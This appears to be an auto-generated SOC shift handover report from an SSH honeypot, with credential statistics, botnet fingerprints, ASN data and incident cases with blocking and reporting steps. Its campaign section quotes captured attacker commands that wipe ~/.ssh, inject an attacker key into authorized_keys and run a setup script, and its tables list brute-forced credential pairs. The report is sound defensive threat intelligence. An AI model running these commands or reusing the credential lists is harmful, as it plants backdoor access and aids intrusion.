# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-05 |
| **Generated At** | 2026-08-05T10:40:50Z |
| **Shift Time** | 10:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **365** |
| Confirmed Threats | **266** |
| False Positives Filtered | **99** (27.1%) |
| Unique Attacker IPs | **151** |
| Countries of Origin | **36** |
| High Severity Cases | **165** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **200** |
| Malware Samples Analyzed | **3** HIGH · **27** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **192** |
| Unique Credential Pairs | **119** |
| Unique Usernames | **45** |
| Unique Passwords | **107** |
| Successful Auth Pairs | **167** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 61 |
| `admin` | 18 |
| `ubnt` | 12 |
| `user` | 9 |
| `GET / HTTP/1.1` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 9 |
| `ubuntu` | 8 |
| `LeitboGi0ro` | 7 |
| `abc123` | 6 |
| `support` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 7 |
| `admin` | `admin` | 6 |
| `support` | `support` | 6 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `123@@@` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwerty12` | `10.0.0.73` | 2026-08-05T04:55:10 |
| `jboss` | `passw0rd@12345678` | `45.153.34.226` | 2026-08-05T04:57:32 |
| `oracle` | `oracle2022` | `94.26.106.19` | 2026-08-05T04:57:34 |
| `view` | `view` | `130.12.182.223` | 2026-08-05T05:00:03 |
| `root` | `peanut16` | `130.12.182.107` | 2026-08-05T05:00:46 |
| `guest` | `qwer1234` | `46.77.69.201` | 2026-08-05T05:03:12 |
| `yaozhenyu` | `yaozhenyu` | `45.156.87.182` | 2026-08-05T05:06:49 |
| `root` | `virgil1` | `130.12.182.107` | 2026-08-05T05:14:09 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-05T05:14:42 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-05T05:14:42 |
| `debian` | `debian4` | `202.82.20.241` | 2026-08-05T05:18:26 |
| `debian` | `debian4` | `200.232.114.71` | 2026-08-05T05:18:39 |
| `admin` | `admin` | `192.34.62.126` | 2026-08-05T05:18:44 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-05T05:18:45 |
| `root` | `12121975` | `94.26.106.33` | 2026-08-05T05:19:31 |
| `ubnt` | `abc123` | `87.117.32.22` | 2026-08-05T05:19:41 |
| `ubnt` | `abc123` | `41.224.62.206` | 2026-08-05T05:19:47 |
| `admin` | `admin` | `115.191.32.57` | 2026-08-05T05:19:58 |
| `root` | `anthony0` | `94.26.106.199` | 2026-08-05T05:27:18 |
| `arpan` | `arpan` | `102.220.160.47` | 2026-08-05T05:27:25 |
| `admin` | `1234` | `94.26.106.199` | 2026-08-05T05:28:55 |
| `operator` | `operator` | `130.12.181.21` | 2026-08-05T05:29:11 |
| `debian` | `debian4` | `10.0.0.73` | 2026-08-05T05:30:26 |
| `admin` | `password` | `130.12.182.107` | 2026-08-05T05:32:04 |
| `ubnt` | `ubnt` | `130.12.182.110` | 2026-08-05T05:32:54 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-05T05:34:50 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-05T05:34:50 |
| `ubnt` | `abc123` | `117.211.15.106` | 2026-08-05T05:36:21 |
| `ubnt` | `abc123` | `14.99.61.248` | 2026-08-05T05:36:29 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `45.33.109.8` | 2026-08-05T05:38:17 |
| `root` | `cj_1234_del` | `102.220.160.47` | 2026-08-05T05:39:11 |
| `service` | `service` | `94.26.106.19` | 2026-08-05T05:39:51 |
| `root` | `Cc123456@` | `102.220.160.41` | 2026-08-05T05:42:04 |
| `config` | `config` | `130.12.182.110` | 2026-08-05T05:45:49 |
| `support` | `support` | `176.53.159.196` | 2026-08-05T05:47:09 |
| `debian` | `debian4` | `221.182.185.190` | 2026-08-05T05:48:06 |
| `mysql` | `yamaha` | `93.152.221.206` | 2026-08-05T05:48:09 |
| `view` | `view` | `130.12.182.227` | 2026-08-05T05:48:29 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `66.228.53.136` | 2026-08-05T05:49:38 |
| `admin` | `default` | `45.153.34.226` | 2026-08-05T05:51:24 |
| `root` | `public` | `10.0.0.73` | 2026-08-05T05:53:10 |
| `user` | `abc123` | `113.158.205.225` | 2026-08-05T05:53:14 |
| `root` | `admin` | `45.153.34.226` | 2026-08-05T05:53:21 |
| `postgres` | `!@#` | `64.89.161.91` | 2026-08-05T05:58:03 |
| `root` | `lisbon` | `45.156.87.192` | 2026-08-05T05:58:06 |
| `root` | `Sai@12345` | `130.12.181.21` | 2026-08-05T06:00:00 |
| `root` | `111285` | `130.12.182.110` | 2026-08-05T06:00:23 |
| `admin` | `admin@1234` | `130.12.182.224` | 2026-08-05T06:02:32 |
| `root` | `sab123` | `130.12.182.225` | 2026-08-05T06:03:02 |
| `root` | `031284` | `130.12.181.23` | 2026-08-05T06:06:36 |
| `root` | `Asd123!Qaz` | `130.12.181.23` | 2026-08-05T06:08:04 |
| `ubuntu` | `Nigg@b@lls!!!` | `94.26.106.19` | 2026-08-05T06:08:05 |
| `support` | `support` | `10.0.0.73` | 2026-08-05T06:10:55 |
| `ubnt` | `ubuntu` | `111.171.125.94` | 2026-08-05T06:12:39 |
| `ubnt` | `ubuntu` | `49.206.201.253` | 2026-08-05T06:12:47 |
| `ubnt` | `ubuntu` | `95.35.29.192` | 2026-08-05T06:12:56 |
| `ubnt` | `ubuntu` | `106.89.60.76` | 2026-08-05T06:13:11 |
| `kearra` | `kearra12345` | `102.220.160.47` | 2026-08-05T06:15:08 |
| `ftp` | `ftp` | `94.26.106.103` | 2026-08-05T06:22:00 |
| `user` | `abc123` | `111.70.23.240` | 2026-08-05T06:23:02 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-05T06:23:08 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-05T06:23:08 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-05T06:23:13 |
| `ocs` | `ocs@123` | `116.181.19.157` | 2026-08-05T06:23:50 |
| `345gs5662d34` | `345gs5662d34` | `116.181.19.157` | 2026-08-05T06:23:55 |
| `ocs` | `3245gs5662d34` | `116.181.19.157` | 2026-08-05T06:23:57 |
| `root` | `zlxx` | `169.211.128.234` | 2026-08-05T06:24:23 |
| `"??$` | `*<((~` | `169.211.128.234` | 2026-08-05T06:24:57 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-05T06:25:13 |
| `admin` | `admin` | `169.211.128.234` | 2026-08-05T06:25:31 |
| `"??$` | `$<ghi` | `169.211.128.234` | 2026-08-05T06:26:05 |
| `admin` | `admin321` | `130.12.182.227` | 2026-08-05T06:26:09 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xcc\xd1\xd1\xca'` | `169.211.128.234` | 2026-08-05T06:26:39 |
| `lghkel	` | `zpz}ld	` | `169.211.128.234` | 2026-08-05T06:26:40 |
| `root` | `7ujMko0vizxv` | `169.211.128.234` | 2026-08-05T06:27:13 |
| `"??$` | `$5<>5$` | `169.211.128.234` | 2026-08-05T06:27:47 |
| `ubnt` | `8888` | `10.0.0.73` | 2026-08-05T06:28:10 |
| `root` | `fidel123` | `169.211.128.234` | 2026-08-05T06:28:21 |
| `admin` | `pass` | `10.0.0.73` | 2026-08-05T06:28:31 |
| `default` | `OxhlwSG8` | `169.211.128.234` | 2026-08-05T06:29:29 |
| `ubnt` | `8888` | `195.222.57.190` | 2026-08-05T06:29:42 |
| `root` | `` | `102.220.160.29` | 2026-08-05T06:34:59 |
| `support` | `support` | `93.152.221.210` | 2026-08-05T06:38:18 |
| `blank` | `123` | `10.0.0.73` | 2026-08-05T06:40:13 |
| `root` | `zrjdktdf` | `130.12.182.227` | 2026-08-05T06:42:55 |
| `operator` | `operator` | `43.228.157.105` | 2026-08-05T06:43:31 |
| `smart` | `P@ssw0rd` | `130.12.181.21` | 2026-08-05T06:43:53 |
| `nobody` | `nobody` | `130.12.182.107` | 2026-08-05T06:44:39 |
| `admin` | `pass` | `138.219.13.21` | 2026-08-05T06:47:55 |
| `admin` | `pass` | `65.20.153.146` | 2026-08-05T06:48:06 |
| `admin` | `123456789` | `130.12.182.110` | 2026-08-05T06:53:36 |
| `admin` | `admin` | `64.89.162.146` | 2026-08-05T06:59:52 |
| `sdadmin` | `51nGleD` | `102.220.160.29` | 2026-08-05T07:03:21 |
| `default` | `4444444444` | `10.0.0.73` | 2026-08-05T07:03:34 |
| `root` | `admin` | `102.220.160.47` | 2026-08-05T07:03:42 |
| `student` | `P@ssw0rd` | `93.152.221.206` | 2026-08-05T07:04:43 |
| `ubuntu` | `data@123` | `102.220.160.47` | 2026-08-05T07:08:19 |
| `AdminGPON` | `ALC#FGU` | `130.12.182.223` | 2026-08-05T07:12:35 |
| `smith` | `1qa@WS` | `102.220.160.41` | 2026-08-05T07:19:00 |
| `guest` | `guest123` | `65.20.133.56` | 2026-08-05T07:21:37 |
| `root` | `leslie13` | `102.220.160.42` | 2026-08-05T07:22:40 |
| `default` | `4444444444` | `106.0.166.123` | 2026-08-05T07:22:41 |
| `root` | `4rch30l0gist` | `94.26.106.19` | 2026-08-05T07:33:13 |
| `telecomadmin` | `admintelecom` | `45.153.34.226` | 2026-08-05T07:33:18 |
| `oracle` | `p@ssw0rd12345` | `130.12.182.225` | 2026-08-05T07:37:06 |
| `root` | `admin` | `102.220.160.29` | 2026-08-05T07:37:50 |
| `root` | `2` | `10.0.0.73` | 2026-08-05T07:38:15 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `45.33.14.5` | 2026-08-05T07:38:44 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `172.236.119.165` | 2026-08-05T07:39:24 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `172.236.228.208` | 2026-08-05T07:39:54 |
| `root` | `2` | `220.93.167.144` | 2026-08-05T07:39:57 |
| `openemm` | `openemm` | `113.171.81.144` | 2026-08-05T07:40:39 |
| `345gs5662d34` | `345gs5662d34` | `113.171.81.144` | 2026-08-05T07:40:44 |
| `openemm` | `3245gs5662d34` | `113.171.81.144` | 2026-08-05T07:40:46 |
| `ubuntu` | `Password1` | `103.216.145.2` | 2026-08-05T07:47:49 |
| `345gs5662d34` | `345gs5662d34` | `103.216.145.2` | 2026-08-05T07:47:53 |
| `ubuntu` | `3245gs5662d34` | `103.216.145.2` | 2026-08-05T07:47:55 |
| `root` | `abcd1234` | `130.12.182.107` | 2026-08-05T07:49:46 |
| `unknown` | `qwerty1` | `10.0.0.73` | 2026-08-05T07:50:18 |
| `app` | `rootroot` | `45.156.87.192` | 2026-08-05T07:55:33 |
| `root` | `@dmin12345` | `130.12.182.227` | 2026-08-05T07:56:12 |
| `root` | `qazpl,okm` | `102.220.160.41` | 2026-08-05T07:56:20 |
| `root` | `2` | `103.68.22.115` | 2026-08-05T07:56:36 |
| `User` | `1` | `27.107.102.154` | 2026-08-05T07:57:35 |
| `User` | `1` | `211.169.212.206` | 2026-08-05T07:57:39 |
| `User` | `1` | `122.187.147.13` | 2026-08-05T07:57:48 |
| `nobody` | `` | `94.26.106.234` | 2026-08-05T07:58:51 |
| `ubuntu` | `hello` | `130.12.182.225` | 2026-08-05T07:59:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `104.155.50.249` | 2026-08-05T07:59:13 |
| `*1` | `$4` | `104.155.50.249` | 2026-08-05T07:59:21 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1051` | `104.155.50.249` | 2026-08-05T07:59:23 |
| `user` | `admin@321` | `49.0.24.107` | 2026-08-05T08:01:08 |
| `345gs5662d34` | `345gs5662d34` | `49.0.24.107` | 2026-08-05T08:01:12 |
| `user` | `3245gs5662d34` | `49.0.24.107` | 2026-08-05T08:01:14 |
| `prueba` | `prueba2025` | `43.165.170.198` | 2026-08-05T08:01:19 |
| `345gs5662d34` | `345gs5662d34` | `43.165.170.198` | 2026-08-05T08:01:22 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-05T08:01:23 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-05T08:01:23 |
| `prueba` | `3245gs5662d34` | `43.165.170.198` | 2026-08-05T08:01:23 |
| `d` | `d` | `119.92.70.82` | 2026-08-05T08:02:52 |
| `345gs5662d34` | `345gs5662d34` | `119.92.70.82` | 2026-08-05T08:02:56 |
| `d` | `3245gs5662d34` | `119.92.70.82` | 2026-08-05T08:02:58 |
| `admin` | `admin@123` | `102.220.160.29` | 2026-08-05T08:05:35 |
| `unknown` | `qwerty1` | `14.33.96.3` | 2026-08-05T08:07:59 |
| `root` | `root12345678` | `77.90.185.20` | 2026-08-05T08:09:03 |
| `user` | `1234` | `130.12.182.223` | 2026-08-05T08:11:55 |
| `user` | `dietpi` | `10.0.0.73` | 2026-08-05T08:13:14 |
| `config` | `ubuntu` | `117.211.15.106` | 2026-08-05T08:13:15 |
| `user` | `12345678` | `10.0.0.73` | 2026-08-05T08:13:34 |
| `root` | `Aa123456...` | `45.153.34.226` | 2026-08-05T08:16:22 |
| `admin` | `1234` | `102.220.160.42` | 2026-08-05T08:17:54 |
| `admin` | `admin` | `34.53.235.100` | 2026-08-05T08:19:04 |
| `root` | `q1w2e3qwe!@#` | `102.220.160.29` | 2026-08-05T08:22:12 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4292` | `104.155.50.249` | 2026-08-05T08:24:01 |
| `root` | `Cjkysirj` | `130.12.182.227` | 2026-08-05T08:25:04 |
| `config` | `ubuntu` | `10.0.0.73` | 2026-08-05T08:25:14 |
| `view` | `view` | `102.220.160.39` | 2026-08-05T08:26:43 |
| `orangepi` | `orangepi` | `102.220.160.29` | 2026-08-05T08:31:22 |
| `root` | `09021989` | `130.12.181.21` | 2026-08-05T08:31:45 |
| `user` | `dietpi` | `112.28.73.142` | 2026-08-05T08:32:07 |
| `admin` | `Admin4321` | `94.26.106.103` | 2026-08-05T08:34:25 |
| `root` | `juliana1` | `102.220.160.42` | 2026-08-05T08:34:41 |
| `root` | `deagle` | `93.152.221.50` | 2026-08-05T08:42:36 |
| `config` | `ubuntu` | `136.56.34.147` | 2026-08-05T08:42:55 |
| `config` | `ubuntu` | `178.178.194.137` | 2026-08-05T08:43:02 |
| `support` | `123` | `10.0.0.73` | 2026-08-05T08:48:24 |
| `kelly` | `kelly` | `130.12.182.230` | 2026-08-05T08:52:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **365** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 107 |
| OpenSSH | 29 |
| Paramiko (Python) | 16 |
| Go SSH scanner | 12 |
| Nmap scanner | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `a591c4ddccc9...` | Mirai/variant | 73 | 28 |
| `acaa53e0a7d7...` | Mirai/variant | 29 | 28 |
| `f555226df196...` | Mirai/variant | 19 | 7 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `a591c4ddccc9...` | libssh | 73 | 28 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 29 | 28 | Mirai/variant |
| `f555226df196...` | libssh | 19 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `113.171.81.144`, `43.165.170.198`, `119.92.70.82`, `103.216.145.2`, `49.0.24.107`, `116.181.19.157`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.s
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **151** |
| Unique ASNs | **85** |
| High-Risk ASNs | **64** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS197769` | VPS Dedicated LLC | 14 | HIGH |
| `AS197170` | TechTies Inc. | 11 | HIGH |
| `AS22773` | Cox Communications Inc. | 9 | MEDIUM |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS63949` | Akamai Connected Cloud | 8 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS48721` | Flyservers S.A. | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (165)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-858274f236ca

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 04:57 |
| **Last Seen** | 2026-08-05 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 04:57:32` | `cowrie.session.connect` |
| `2026-08-05 04:57:32` | `cowrie.client.version` |
| `2026-08-05 04:57:32` | `cowrie.client.kex` |
| `2026-08-05 04:57:32` | `cowrie.login.success` |
| `2026-08-05 04:57:32` | `cowrie.direct-tcpip.request` |
| `2026-08-05 04:57:33` | `cowrie.direct-tcpip.data` |
| `2026-08-05 04:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477829270059

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]19` |
| **First Seen** | 2026-08-05 04:57 |
| **Last Seen** | 2026-08-05 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 04:57:33` | `cowrie.session.connect` |
| `2026-08-05 04:57:33` | `cowrie.client.version` |
| `2026-08-05 04:57:33` | `cowrie.client.kex` |
| `2026-08-05 04:57:34` | `cowrie.login.success` |
| `2026-08-05 04:57:34` | `cowrie.direct-tcpip.request` |
| `2026-08-05 04:57:34` | `cowrie.direct-tcpip.data` |
| `2026-08-05 04:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]19` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf0b633ebfa

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]223` |
| **First Seen** | 2026-08-05 05:00 |
| **Last Seen** | 2026-08-05 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:00:02` | `cowrie.session.connect` |
| `2026-08-05 05:00:02` | `cowrie.client.version` |
| `2026-08-05 05:00:02` | `cowrie.client.kex` |
| `2026-08-05 05:00:03` | `cowrie.login.success` |
| `2026-08-05 05:00:03` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:00:03` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea19bac64a0c

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-05 05:00 |
| **Last Seen** | 2026-08-05 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:00:45` | `cowrie.session.connect` |
| `2026-08-05 05:00:45` | `cowrie.client.version` |
| `2026-08-05 05:00:45` | `cowrie.client.kex` |
| `2026-08-05 05:00:46` | `cowrie.login.success` |
| `2026-08-05 05:00:46` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:00:46` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1fdc7100898

| Field | Detail |
|---|---|
| **Source IP** | `46.77.69[.]201` |
| **First Seen** | 2026-08-05 05:03 |
| **Last Seen** | 2026-08-05 05:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:03:10` | `cowrie.session.connect` |
| `2026-08-05 05:03:10` | `cowrie.client.version` |
| `2026-08-05 05:03:10` | `cowrie.client.kex` |
| `2026-08-05 05:03:12` | `cowrie.login.success` |
| `2026-08-05 05:03:12` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.77.69[.]201` to AbuseIPDB if not already reported
- [ ] Block `46.77.69[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc76ce422db6

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-05 05:06 |
| **Last Seen** | 2026-08-05 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:06:49` | `cowrie.session.connect` |
| `2026-08-05 05:06:49` | `cowrie.client.version` |
| `2026-08-05 05:06:49` | `cowrie.client.kex` |
| `2026-08-05 05:06:49` | `cowrie.login.success` |
| `2026-08-05 05:06:49` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:06:50` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4387396463e

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-05 05:14 |
| **Last Seen** | 2026-08-05 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:14:09` | `cowrie.session.connect` |
| `2026-08-05 05:14:09` | `cowrie.client.version` |
| `2026-08-05 05:14:09` | `cowrie.client.kex` |
| `2026-08-05 05:14:09` | `cowrie.login.success` |
| `2026-08-05 05:14:10` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:14:10` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d277cb6439c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-05 05:14 |
| **Last Seen** | 2026-08-05 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:14:41` | `cowrie.session.connect` |
| `2026-08-05 05:14:41` | `cowrie.client.version` |
| `2026-08-05 05:14:42` | `cowrie.client.kex` |
| `2026-08-05 05:14:42` | `cowrie.login.success` |
| `2026-08-05 05:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f6197c5ce5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
